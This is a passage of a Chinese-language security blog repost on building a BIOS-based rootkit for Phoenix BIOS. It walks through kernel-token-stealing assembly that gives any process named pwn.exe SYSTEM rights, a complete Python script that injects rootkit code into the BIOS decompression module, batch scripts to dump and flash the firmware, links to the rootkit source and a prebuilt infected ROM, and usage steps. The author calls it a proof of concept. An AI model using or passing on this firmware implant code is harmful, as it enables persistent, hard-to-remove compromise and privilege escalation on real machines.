<li class=""><span class="md-line md-end-block"><span class="">对引导加载程序进行的修改将导致它修改Windows内核。这反过来将允许将任意代码注入Windows内核，从而允许特权提升功能。</span></span></li>
</ul>
<p><span class="md-line md-end-block"><span class="">随着我们的BIOS注入加上bootkit的加载流程如下：</span></span></p>
<p><img class="alignnone size-full wp-image-101334 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/bios-6.png" alt="bios (6)" width="228" height="355" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/bios-6.png 228w, http://www.mottoin.com/wp-content/uploads/2017/04/bios-6-193x300.png 193w" sizes="(max-width: 228px) 100vw, 228px" /></p>
<p><span class="md-line md-end-block"><span class="">这些修改的结果是将bootkit复制到内存并在BIOS执行，从硬盘驱动器加载操作系统，然后以已修改的操作系统结束，以便某些进程将以附加权限运行。以下屏幕截图显示了一旦找到引导加载程序和内核并成功修改它们的bootkit代码所显示消息：</span></span></p>
<p><img class="alignnone size-full wp-image-101335 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/bios-7.png" alt="bios (7)" width="960" height="540" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/bios-7.png 960w, http://www.mottoin.com/wp-content/uploads/2017/04/bios-7-300x169.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/bios-7-768x432.png 768w" sizes="(max-width: 960px) 100vw, 960px" /></p>
<p><span class="md-line md-end-block"><span class="">用于此rootkit的代码设置为检查名为“pwn.exe”的任何进程，如果找到，请给它额外的权限。这是每30秒完成一次，所以权限的差异很容易看出来。这个功能可以在下面的代码和屏幕截图中看到：</span></span></p>
<pre class="md-fences md-end-block" lang="" contenteditable="false">xor ecx,ecx
mov word cx, [CODEBASEKERNEL + Imagenameoffset]
cmp dword [eax+ecx], "PWN."         ; Check if the process is named PWN.exe
je patchit
jne donotpatchtoken             ; jmp takes 5 bytes but this takes 2 bytes

patchit:
mov word cx, [CODEBASEKERNEL + SecurityTokenoffset]
mov dword [eax + ecx],ebx       ; replace it with services.exe token, offset for sec token is 200</pre>
<p><img class="alignnone size-full wp-image-101336 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/bios-8.png" alt="bios (8)" width="1091" height="679" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/bios-8.png 1091w, http://www.mottoin.com/wp-content/uploads/2017/04/bios-8-300x187.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/bios-8-768x478.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/bios-8-1024x637.png 1024w" sizes="(max-width: 1091px) 100vw, 1091px" /></p>
<p><span class="md-line md-end-block"><span class="">已经开发的BIOS rootkit可以包含更多的功能（例如Vbootkit2中包含的内容）。</span></span></p>
<h2 class="md-end-block md-heading"><span class="">BIOS解压和 Patching</span></h2>
<p><span class="md-line md-end-block"><span class="">现在我们知道如何将rootkit注入到BIOS中，下一步是使用我们的rootkit代码来 Patching BIOS。为此，我们需要提取所有的BIOS模块， 修复解压缩模块，并重新打包所有的内容。可以使用phxdeco命令行工具或Phoenix BIOS Editor来提取模块。一旦解压缩模块被提取，以下代码将使用我们的rootkit进行修补：</span></span></p>
<pre class="md-fences md-end-block" lang="" contenteditable="false">#!/usr/bin/python
import os,struct,sys
###############################################
# BIOS Decompression module patching script - By Wesley Wineberg
#
# The Phoenix BIOS Editor application (for Windows) will generate a number of module files
# including the decompression module which will be named "DECOMPC0.ROM". These files are
# saved to C:\Program Files\Phoenix Bios Editor\TEMP (or similar) once a BIOS WPH file is
# opened. The decompression module file can be modified with this script. Once modified,
# any change can be made to the BIOS modules in the BIOS editor so that a new BIOS WPH file
# can be generated by the BIOS editor. The decompression module can alternatively be
# extracted by phnxdeco.exe, but this does not allow for reassembly. This script requires
# that NASM be present on the system it is run on.
#
# INPUT:
# This patching script requires the name and path to the BIOS rootkit asm file to be passed
# as an argument on the command line.
#
# OUTPUT:
# This script will modify the DECOMPC0.ROM file located in the same directory as the script
# so that it will run the BIOS rootkit asm code.
# Display usage info
if len(sys.argv) &lt; 2:
print "Modify and rebuild Phoenix BIOS DECOMP0.ROM module. Rootkit ASM code filename
required!"
exit(0)
# Find rootkit code name
shellcode = sys.argv[1].lower()
# Assemble the assembler code to be injected. NASM is required to be present on the system
# or this will fail!
os.system('nasm %s' % shellcode)
# Open and display the size of the compiled rootkit code
shellcodeout = shellcode[0:len(shellcode)-4]
decomphook = open(shellcodeout,'rb').read()
print "Rootkit code loaded: %d bytes" % len(decomphook)
# The next line contains raw assembly instructions which will be placed 0x23 into the
decompression rom
# file. The decompression rom contains a header, followed by a number of push instructions
and then
# a CLD instruction. This code will be inserted immediately after, and will overwrite a
number of
# mov instructions. These need to be called by the rootkit code before it returns so that
#the normal decompression functions can continue.
# The assembler instruction contained below is a Near Call which will jump to the end of the
# decompression rom where the rootkit code has been inserted. This is followed by three NOP
# instructions as filler.
minihook = '\xe8\x28\x04\x90\x90\x90'
# The following would work but is an absolute call, not ideal!
# minihook = '\x9a\x5A\x04\xDC\x64\x90' # call far +0x45A
# Load the decompression rom file
decorom = open('DECOMPC0.ROM','rb').read()
# Hook location is 0x23 in to the file, just past the CLD instruction

hookoffset=0x23
# Insert hook contents into the decompression rom, overwriting what was there previously
decorom = decorom[:hookoffset]+minihook+decorom[len(minihook)+hookoffset:]
# Pad the decompression rom with 100 NOP instructions. This is not needed, but does make it
# easier to identify where the modification has taken place.
decorom+="\x90"*100+decomphook
# Pad an additional 10 NOP's at the end.
decorom=decorom+'\x90'*10
# Recalculate the ROM size, so that the header can be updated
decorom=decorom[:0xf]+struct.pack("&lt;H",len(decorom)-0x1A)+decorom[0x11:]
# Save the patched decompression rom over the previous copy
out=open('DECOMPC0.ROM','wb')
out.write(decorom)
out.close()
# Output results
print "The DECOMPC0.ROM file has now been patched."</pre>
<p><span class="md-line md-end-block"><span class="">如何调用上述脚本的一个例子是：</span></span></p>
<p><span class="md-line md-end-block"><span spellcheck="false"><code>python patchdecomp.py biosrootkit.asm</code></span></span></p>
<p><span class="md-line md-end-block"><span class="">如果一切顺利，您应该看到类似于以下内容：</span></span></p>
<p><span class="md-line md-end-block"><span spellcheck="false"><code>Rootkit code loaded: 1845 bytes</code></span></span></p>
<p><span class="md-line md-end-block"><span class="" spellcheck="false"><code>The DECOMPC0.ROM file has now been patched.</code></span></span></p>
<h2 class="md-end-block md-heading">BIOS重组</h2>
<p><span class="md-line md-end-block"><span class="">对于诸如VMware附带的原始BIOS文件，Phoenix Bios编辑器（可从网上获得）中附带的许多命令行实用程序可用于重新组装所有内容。稍后在使用真正的PC进行测试时，有必要将BIOS备份，因此使用的重组工具是Phoenix Bios Editor的GUI版本。这意味着，不可能有一个很简单就能在感染BIOS的系统上运行的应用程序，至少不使用现成的工具。</span></span></p>
<p><span class="md-line md-end-block"><span class="">这意味着BIOS感染是分三阶段的过程，需要一些手动操作，主要用于重新打包。以下显示打开BIOS映像的Phoenix BIOS编辑器：</span></span></p>
<p><img class="alignnone size-full wp-image-101337 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/bios-9.png" alt="bios (9)" width="960" height="540" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/bios-9.png 960w, http://www.mottoin.com/wp-content/uploads/2017/04/bios-9-300x169.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/bios-9-768x432.png 768w" sizes="(max-width: 960px) 100vw, 960px" /></p>
<p><span class="md-line md-end-block"><span class="">Phoenix BIOS编辑器不是专门用于交换模块的。当BIOS映像首次打开时，所有BIOS模块将被提取到位于C:\Program Files\Phoenix BIOS Editor\TEMP\的文件夹中。解压缩模块可以从该文件夹复制，修补和替换。Phoenix BIOS编辑器不允许您在不修改BIOS的情况下保存BIOS，因此需要修改字符串值，然后将其更改（或者直接留下），以便可以保存BIOS。</span></span></p>
<p><span class="md-line md-end-block"><span class="">如果您想自己尝试所有这些，基于BIOS的rootkit源代码和修补脚本可以从文末的链接下载。</span></span></p>
<h2 class="md-end-block md-heading"><span class="">物理机测试</span></h2>
<p><span class="md-line md-end-block"><span class="">Phoenix BIOS与所有基于VMware的开发一起使用，因此也被选择用于使用物理PC进行测试。所有的物理（而不是虚拟）BIOS测试都是使用惠普Pavilion ze4400笔记本电脑完成的。BIOS测试最初计划用于PC而不是笔记本电脑，因为如果需要，可以访问PC主板进行重新整理将更容易。尽管如此，马上找到一台带有Phoenix BIOS的电脑明显不靠谱，所以使用了一台笔记本电脑（特别感谢David为我的BIOS中不经意的写了源代码时重新刷新笔记本电脑！）</span></span></p>
<h2 class="md-end-block md-heading">PC BIOS检索</h2>
<p><span class="md-line md-end-block"><span class="">修改真实系统BIOS的第一步是提取它的副本。凤凰有两种不同的工具，他们通常为此提供一种工具，一种称为“Phlash16”，另一种称为“WinPhlash”。Phlash16是一个命令行实用程序（具有基于控制台的GUI），但只能从DOS运行。WinPhlash，如其名称所示，从Windows运行。虽然这是一个基于GUI的实用程序，它也将接受命令行选项，使我们能够自动执行BIOS检索过程。对于这个项目，我最终做了一些脚本来自动执行BIOS提取和修补，但是它们的作用非常基本和有限的。</span></span></p>
<p><span class="md-line md-end-block"><span class="">以下批处理脚本将BIOS复制到名为BIOSORIG.WPH的文件中，然后检查它是否以前已被修改。CheckFlash.py Perl脚本只是检查我的名字的BIOS内容，不会在任何未修补的BIOS中。</span></span></p>
<pre class="md-fences md-end-block" lang="" contenteditable="false">@rem This file dumps the bios and checks if it has previously been patched.
@rem Dump
WinPhlash\WinPhlash.exe /ro=BIOSORIG.WPH
@rem Check if the BIOS has been patched already
Python\PortablePython_1.1_py2.6.1\App\python CheckFlash.py WinPhlash\BIOSORIG.WPH</pre>
<h2 class="md-end-block md-heading"><span class="">PC BIOS解压缩和</span>Patching</h2>
<p><span class="md-line md-end-block"><span class="">在检索到BIOS后，下一步是使用我们的rootkit代码进行修补。这可以使用与上述部分中使用的完全相同的脚本来完成。这个项目的目标是设计补丁以及修补过程尽可能兼容。我认为这是完全可能的，所以相同的工具可以用于BIOS类型相同，硬件完全不同的机器。</span></span></p>
<h3 class="md-end-block md-heading"><span class="">PC BIOS重新组装</span></h3>
<p><span class="md-line md-end-block"><span class="">虽然有一个免费的工具可以从Phoenix BIOS中提取模块，但似乎只有Phoenix Bios编辑器才能根据需要对典型的PC进行重新组装。WinPhlash工具需BIOS提供附加信息，BIOS将与原始BIOS一起存储在WPH文件中。在测试了许多不同的选项之后，似乎成功重新组装WPH文件的唯一方法是使用GUI Phoenix Bios Editor。这意味着，不可能简单地有一个可以在会感染BIOS的系统上运行的应用程序，至少不使用现成的工具。</span></span></p>
<p><span class="md-line md-end-block"><span class="">理论上应该可以逆向WPH格式文件并创建一个自定义的BIOS重组工具，但这不在本项目的范围之内。相反，BIOS感染是一个三个阶段的过程，需要一些主要用于重新组装的手动操作。</span></span></p>
<p><span class="md-line md-end-block"><span class="">与修补VMware BIOS一样，可以使用Phoenix BIOS编辑器重新组装修补模块的技巧。当BIOS映像首次打开时，所有BIOS模块将被提取到位于C:\Program Files\Phoenix BIOS Editor\TEMP\的文件夹中。解压缩模块可以从该文件夹复制，修补和替换。Phoenix BIOS编辑器将不允许您在不修改BIOS的情况下保存BIOS，因此需要修改字符串值，然后将其更改（或者直接留下），以便可以保存BIOS。</span></span></p>
<h2 class="md-end-block md-heading"><span class="">BIOS Flashing</span></h2>
<p><span class="md-line md-end-block"><span class="">一旦将BIOS重新组装到WPH文件中，以下批处理脚本将将新的BIOS映像刷新到BIOS EEPROM中，然后重新启动PC，以使其生效：</span></span></p>
<pre class="md-fences md-end-block" lang="" contenteditable="false">@rem This file uploads a file named "BIOSPATCHED.WPH" to the BIOS. Will reboot system when done.
WinPhlash\WinPhlash.exe /bu=BIOSBACKUP.WPH /I BIOSPATCHED.WPH</pre>
<h3 class="md-end-block md-heading">笔记本修改结果</h3>
<p><span class="md-line md-end-block"><span class="">将所有描述的东西放在一起，以下显示了BIOS代码Flashing到笔记本电脑上（从上面详细介绍的infect.bat脚本运行）：</span></span></p>
<p><img class="alignnone size-full wp-image-101338 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/bios-1.jpg" alt="bios (1)" width="1136" height="852" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/bios-1.jpg 1136w, http://www.mottoin.com/wp-content/uploads/2017/04/bios-1-300x225.jpg 300w, http://www.mottoin.com/wp-content/uploads/2017/04/bios-1-768x576.jpg 768w, http://www.mottoin.com/wp-content/uploads/2017/04/bios-1-1024x768.jpg 1024w" sizes="(max-width: 1136px) 100vw, 1136px" /></p>
<p><span class="md-line md-end-block">闪存完成后，BIOS rootkit成功运行并加载到Windows内核中。以下屏幕截图显示了一个最初作为普通用户启动的命令提示符，然后在30秒后将其权限升级：</span></p>
<p><img class="alignnone size-full wp-image-101339 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/bios-2-1.jpg" alt="bios (2)" width="1136" height="852" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/bios-2-1.jpg 1136w, http://www.mottoin.com/wp-content/uploads/2017/04/bios-2-1-300x225.jpg 300w, http://www.mottoin.com/wp-content/uploads/2017/04/bios-2-1-768x576.jpg 768w, http://www.mottoin.com/wp-content/uploads/2017/04/bios-2-1-1024x768.jpg 1024w" sizes="(max-width: 1136px) 100vw, 1136px" /></p>
<p><span class="md-line md-end-block"><span class="">这表明BIOS rootkit足够便于在多个系统（VMware，HP笔记本电脑）上工作，并且感染机制正常且正常工作。</span></span></p>
<p><span class="md-line md-end-block"><span class="">为该项目开发的“rootkit”仅实现一个简单的任务，但是关于Vbootkit2软件的说明，我们可以添加额外的功能。Phoenix制作BIOS由该项目进行复现，Phoenix BIOS和其他厂商的BIOS之间有很多相似之处。虽然可能需要为每个单独的制造商创建代码，但是没有大量的不同的BIOS供应商，因此将这个rootkit功能扩展到所有常见的制造商应该是可行的。</span></span></p>
<p><span class="md-line md-end-block"><span class="">在介绍中，我注意到新的BIOS功能，例如签名的BIOS更新，从安全角度看，远远不止这个问题。但也值得一提的是，有比“新”电脑更多的“遗留”电脑，所以这种类型的攻击仍然是一个很长一段时间的问题。</span></span></p>
<h3 class="md-end-block md-heading">演示VMware BIOS和源代码</h3>
<p><span class="md-line md-end-block"><span class="">提供以下源代码和修补BIOS作为概念证明。我不希望人们将其用于任何恶意的目的，而是表明这种攻击在较旧的BIOS配置上是完全可行的。我不希望有人以现在的形式将我在线发布此代码其变为任何有用的恶意软件。</span></span></p>
<p><span class="md-line md-end-block"><span class="">如前几节所述，该代码应该能够修复大部分的“Phoenix”BIOS。修补脚本可以在这里下载：</span></span><span class="md-line md-end-block"><span class=""><a spellcheck="false" href="http://www.exfiltrated.com/BIOS_Based_Rootkit_Patch_Scripts.zip">BIOS_Based_Rootkit_Patch_Scripts.zip</a></span></span></p>
<p><span class="md-line md-end-block"><span class="">BIOS rootkit的源代码可以在这里下载：</span></span><span class="md-line md-end-block"><span class=""><a spellcheck="false" href="http://www.exfiltrated.com/biosrootkit.asm">biosrootkit.asm</a></span></span></p>
<p><span class="md-line md-end-block"><span class="">如果使用上述脚本/源代码，则需要</span><span class=""><a spellcheck="false" href="http://www.nasm.us/pub/nasm/releasebuilds/">NASM</a></span><span class="">编译代码才能pach到BIOS中。NASM应该添加到您的变量路径中，或者您应该更新修补脚本使其成功工作。您还将需要一个Phoenix BIOS编辑器的副本，或者一个相当于将解压缩模块组合到一个完整BIOS中的免费工具</span></span></p>
<p><span class="md-line md-end-block"><span class="">如果您不想自己编译这一切，只想尝试一下，可以在此下载与VMware一起使用的BIOS：</span></span><span class="md-line md-end-block"><span class=""><a spellcheck="false" href="http://www.exfiltrated.com/BIOS_rootkit_demo.ROM">BIOS_rootkit_demo.ROM</a></span></span></p>
<h3 class="md-end-block md-heading"><span class="">PoC用法和注释</span></h3>
<p><span class="md-line md-end-block"><span class="">如果你不喜欢阅读上面的文章，这里是如何使用它的总结，以及它的作用。</span></span></p>
<ul class="ul-list" data-mark="-">
<li class=""><span class="md-line md-end-block"><span class="">首先从上述链接下载BIOS_rootkit_demo.ROM BIOS映像。</span></span></li>
<li class=""><span class="md-line md-end-block"><span class="">您需要安装VMware的一个副本以及一个Windows XP操作系统客户端进行测试。我已经通过一系列不同版本的VMware Workstation以及最新版本的VMware Player（免费）对其进行了测试。</span></span></li>
<li class=""><span class="md-line md-end-block">在打开您的客户端WinXP VM之前，请浏览到您的计算机上存储虚拟机的位置，并在记事本中打开.vmx文件（即WindowsXP.vmx或任何您的VM文件）。在最后添加这一行：</span>
<pre class="md-fences md-end-block" lang="" contenteditable="false">bios440.filename = "BIOS_rootkit_demo.ROM"</pre>
</li>
<li class=""><span class="md-line md-end-block"><span class="">确保你在该文件夹时将BIOS_rootkit_demo.ROM复制到该文件夹。</span></span></li>
<li class=""><span class="md-line md-end-block"><span class="">现在打开并启动VM，然后将程序重命名为pwn.exe（例如cmd.exe）。</span></span></li>
<li><span class="md-line md-end-block">等待30秒钟，然后启动任务管理器。Pwn.exe应该以用户“SYSTEM”的形式运行，而不是您登录到XP的任何用户。</span></li>
</ul>
<p><span class="md-line md-end-block"><span class="">上述步骤的列表是在理想的环境中工作。测试显示以下注意事项！</span></span></p>
<ul class="ul-list" data-mark="-">
<li class=""><span class="md-line md-end-block"><span class="">操作系统不稳定。有时候启动或者只是简单地关闭你的pwn.exe应用程序Windows将会BSOD。</span></span></li>
<li class=""><span class="md-line md-end-block"><span class="">如果您在30秒的权限提升之前打开它，可以使用像whoami这样的东西来检查你的权限。</span></span></li>
<li class=""><span class="md-line md-end-block"><span class="">虽然我已经成功地将它加载到真正的PC上，但是如果你这样做，我也不会对结果负责。如果你以一种可怕的方式把你的主板弄坏了，我也很高兴，反正我无法帮助你！自己承担您自己的风险！</span></span></li>
<li class=""><span class="md-line md-end-block"><span class="">如果您只是想观看这个视频，Colin已经在YouTube上放了一个：</span></span>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p><embed src="http://player.youku.com/player.php/sid/XMjcyODA5MTIwNA==/v.swf" allowFullScreen="true" quality="high" width="480" height="400" align="middle" allowScriptAccess="always" type="application/x-shockwave-flash"></embed></p>
<p>&nbsp;</li>
</ul>
<p style="text-align: center;"><span style="color: #ff0000;"><strong>*来源：<a style="color: #ff0000;" href="https://n0where.net/bios-based-rootkits/">n0where</a>，转载请注明来自MottoIN</strong></span></p>
<p>&nbsp;</p>
                                                        <div class="entry-copyright"><p>原创文章，作者：Jarry，如若转载，请注明出处：http://www.mottoin.com/101307.html</p></div>                        </div>
                        <div class="entry-footer">
                            <div class="entry-tag"><a href="http://www.mottoin.com/tag/bios" rel="tag">BIOS</a><a href="http://www.mottoin.com/tag/rootkit" rel="tag">rootkit</a></div>
                            <div class="entry-action">
                                <div class="btn-zan" data-id="101307"><i class="fa fa-thumbs-up"></i> 赞 <span class="entry-action-num">(0)</span></div>

                                
                            </div>
                            <div class="entry-bar">
                                <div class="entry-bar-inner clearfix">
                                                                            <div class="author pull-left">
                                            <a data-user="12" target="_blank" href="http://www.mottoin.com/user/hypnos/" class="avatar">
                                                <img src="http://gravatar.com/avatar/?s=400&d=mm" class="func-um_user gravatar avatar avatar-60 um-avatar um-avatar-gravatar" width="60" height="60" alt="Jarry" />                                                Jarry                                            </a>
                                            <span class="author-title">普通用户</span>                                         </div>
                                                                        <div class="info pull-right">
                                        <div class="info-item meta">
                                            <a class="meta-item j-heart" href="javascript:;" data-id="101307"><i class="fa fa-heart"></i> <span class="data">0</span></a>
                                            <a class="meta-item" href="#comments"><i class="fa fa-comment"></i> <span class="data">0</span></a>
                                                                                    </div>
                                        <div class="info-item share">
                                            <a class="meta-item" href="javascript:;">
                                                <i class="fa fa-wechat"></i>
                                                <span class="wx-wrap">
                                                    <img src="//pan.baidu.com/share/qrcode?w=320&h=320&url=http://www.mottoin.com/101307.html">
                                                    <span>扫码分享到微信</span>
                                                </span>
                                            </a>
                                            <a class="meta-item" href="http://share.baidu.com/s?type=text&searchPic=1&sign=on&to=tsina&key=&url=http%3A%2F%2Fwww.mottoin.com%2F101307.html&title=%E5%9F%BA%E4%BA%8EBIOS%E7%9A%84Rootkit" target="_blank"><i class="fa fa-weibo"></i></a>
                                            <a class="meta-item" href="http://share.baidu.com/s?type=text&searchPic=1&sign=on&to=qzone&key=&url=http%3A%2F%2Fwww.mottoin.com%2F101307.html&title=%E5%9F%BA%E4%BA%8EBIOS%E7%9A%84Rootkit" target="_blank"><i class="fa fa-qq"></i></a>
                                        </div>
                                        <div class="info-item act">
                                            <a href="javascript:;" id="j-reading"><i class="fa fa-file-text"></i></a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                                                        <h3 class="entry-related-title">相关推荐</h3><ul class="entry-related clearfix"><li><a href="http://www.mottoin.com/92660.html" title="Zigbee 安全与 IoT 设备漏洞利用">Zigbee 安全与 IoT 设备漏洞利用</a></li><li><a href="http://www.mottoin.com/101136.html" title="使用W3C环境光传感器API窃取敏感浏览器数据">使用W3C环境光传感器API窃取敏感浏览器数据</a></li><li><a href="http://www.mottoin.com/91910.html" title="傲游浏览器任意文件写入, 代码执行, UXSS, SQL注入分析">傲游浏览器任意文件写入, 代码执行, UXSS, SQL注入分析</a></li><li><a href="http://www.mottoin.com/95168.html" title="Android签名机制简介">Android签名机制简介</a></li><li><a href="http://www.mottoin.com/93727.html" title="APP逆向分析之钉钉抢红包插件的实现-iOS篇">APP逆向分析之钉钉抢红包插件的实现-iOS篇</a></li><li><a href="http://www.mottoin.com/101059.html" title="Ubuntu LightDM Guest 账户本地提权漏洞详情（CVE-2017-7358）">Ubuntu LightDM Guest 账户本地提权漏洞详情（CVE-2017-7358）</a></li><li><a href="http://www.mottoin.com/94066.html" title="McAfee for Linux Vulnerability Writeup">McAfee for Linux Vulnerability Writeup</a></li><li><a href="http://www.mottoin.com/99629.html" title="如何攻击智能电视">如何攻击智能电视</a></li><li><a href="http://www.mottoin.com/98372.html" title="如何从内存中恢复丢失的Python代码">如何从内存中恢复丢失的Python代码</a></li><li><a href="http://www.mottoin.com/84616.html" title="浅谈权限滥用的防御">浅谈权限滥用的防御</a></li></ul>                        </div>
                        
<div id="comments" class="entry-comments">
    	<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">发表评论 <small><a rel="nofollow" id="cancel-comment-reply-link" href="/101307.html#respond" style="display:none;">取消回复</a></small></h3><div class="comment-form"><div class="comment-must-login">请登录后评论...</div><div class="form-submit"><div class="form-submit-text pull-left"><a href="http://www.mottoin.com/login">登录</a>后才能评论</div> <input name="submit" type="submit" id="must-submit" class="submit" value="发表"></div></div>	</div><!-- #respond -->
		</div><!-- .comments-area -->                    </div>
                </article>
                    </div>
        <aside class="sidebar">
            <div id="profile-3" class="widget widget_profile">                <div class="cover_photo"></div>
                        <div class="avatar-wrap">
                <a target="_blank" href="http://www.mottoin.com/user/hypnos/" class="avatar-link"><img src="http://gravatar.com/avatar/?s=400&d=mm" class="func-um_user gravatar avatar avatar-120 um-avatar um-avatar-gravatar" width="120" height="120" alt="Jarry" /></a></div>
            <div class="profile-info">
                <p><span class="author-name">Jarry</span><span class="author-title">普通用户</span></p>
                <p class="author-description"></p>
            </div>
            <div class="profile-posts">
                <h3 class="widget-title"><span>最近文章</span></h3>
                <ul>                    <li><a href="http://www.mottoin.com/101885.html" title="登录工程：现代Web应用中的身份验证技术">登录工程：现代Web应用中的身份验证技术</a></li>
                                    <li><a href="http://www.mottoin.com/101846.html" title="SAML的脆弱性分析">SAML的脆弱性分析</a></li>
                                    <li><a href="http://www.mottoin.com/101811.html" title="网络安全存隐患 研究发现工业机器人极易被黑">网络安全存隐患 研究发现工业机器人极易被黑</a></li>
                                    <li><a href="http://www.mottoin.com/101798.html" title="使用Netcat[nc]连接payload的两种方式">使用Netcat[nc]连接payload的两种方式</a></li>
                                    <li><a href="http://www.mottoin.com/101705.html" title="PowerShell注入技巧：无盘持久性和绕过技术">PowerShell注入技巧：无盘持久性和绕过技术</a></li>
                </ul>            </div>
            </div><div id="custom_html-3" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><a class="btn-post" href="/question"><i class="fa fa-edit"></i> 我要提问</a></div></div><div id="post-thumb-3" class="widget widget_post_thumb">            <ul>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/170918-Cox-The-Hackers-Hitting-Back-At-Cybercriminals-hero_vkcor5-480x300.gif" width="480" height="300" alt="“黑客反击”的合法化之争">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">“黑客反击”的合法化之争</a></p>
                            <p class="item-date">2017年9月20日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105917.html" title="美参议员要求电信巨头们回应SS7信令系统的安全问题">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG929-480x300.jpeg" width="480" height="300" alt="美参议员要求电信巨头们回应SS7信令系统的安全问题">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105917.html" title="美参议员要求电信巨头们回应SS7信令系统的安全问题">美参议员要求电信巨头们回应SS7信令系统的安全问题</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105914.html" title="美国国土安全部发布禁止使用卡巴斯基产品的明细">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG928-480x300.jpeg" width="480" height="300" alt="美国国土安全部发布禁止使用卡巴斯基产品的明细">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105914.html" title="美国国土安全部发布禁止使用卡巴斯基产品的明细">美国国土安全部发布禁止使用卡巴斯基产品的明细</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105885.html" title="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG906-480x300.jpeg" width="480" height="300" alt="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105885.html" title="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105879.html" title="全球首款网络安全概念车驶入上海滩">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/15057198871-480x300.png" width="480" height="300" alt="全球首款网络安全概念车驶入上海滩">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105879.html" title="全球首款网络安全概念车驶入上海滩">全球首款网络安全概念车驶入上海滩</a></p>
                            <p class="item-date">2017年9月18日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105872.html" title="暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG897-480x300.jpeg" width="480" height="300" alt="暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105872.html" title="暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3">暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3</a></p>
                            <p class="item-date">2017年9月18日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105865.html" title="美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG896-480x300.jpeg" width="480" height="300" alt="美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁">                                </a>
                            </div>
                                                <div class="item-content">
